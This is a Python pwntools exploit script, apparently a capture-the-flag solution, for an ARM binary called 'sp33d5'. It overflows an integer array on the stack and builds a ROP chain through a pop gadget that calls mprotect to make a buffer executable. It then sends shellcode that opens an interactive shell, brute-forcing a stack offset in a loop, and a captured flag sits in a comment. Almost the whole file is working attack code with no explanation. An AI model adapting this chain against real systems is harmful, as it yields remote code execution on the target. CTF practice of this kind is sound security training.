#!/usr/bin/env python3
from pwn import *

# -0000000000000050     int numbers[16];
# -0000000000000010     _DWORD val;
# -000000000000000C     _DWORD cur_number;
# -0000000000000008     _DWORD tot;
# -0000000000000004     // padding byte
# -0000000000000003     // padding byte
# -0000000000000002     // padding byte
# -0000000000000001     // padding byte
# +0000000000000000     _DWORD __saved_registers[3];
#                              ^^^ r4, r7, lr


def main_1(bias=0):
    os.environ["QEMU_GDB"] = "1234"
    context.arch = "arm"
    shellcode = asm(pwnlib.shellcraft.arm.linux.sh())
    # with process(["./sp33d5"]) as tube:
    with connect("sp33d.play.hfsc.tf", 18088) as tube:
        buf = 0x7A268
        mprotect = 0x27E01
        gadget = 0x0003F128  # pop {r0, r1, r2, r3, r5, r6, r7, ip, lr, pc}
        for value in (
            -1,
            -1,
            -1,
            -1,
            -1,
            -1,
            -1,
            -1,
            -1,
            -1,
            -1,
            -1,
            -1,
            -1,
            -1,
            -1,
            -1,
            0x408000CC + bias,  # stack skip
            gadget,
            buf & ~0xFFF,  # mprotect buf
            0x1000,  # mprotect len
            0x7,  # mprotect prot
            -1,  # mprotect r3
            -1,  # mprotect r5
            -1,  # mprotect r6
            -1,  # mprotect r7
            -1,  # mprotect ip
            buf + 4,  # mprotect lr - shellcode
            mprotect,  # mprotect pc
        ):
            tube.sendlineafter(b"num: ", str(value).encode())
        tube.sendlineafter(b"num: ", b"0".ljust(4, b"\x00") + shellcode)
        tube.recvuntil(b"tot:")
        tube.recvline()
        time.sleep(1)
        tube.sendline(b"echo qqq")
        tube.recvuntil(b"qqq")
        tube.interactive()


def main():
    bias = 3088
    main_1(bias)
    # midnight{a7b646b85b6c917339c265f9f31be184}
    for bias in range(4000, 1244, -4):
        print(f">>> {bias}")
        try:
            main_1(bias)
        except EOFError:
            pass


if __name__ == "__main__":
    main()
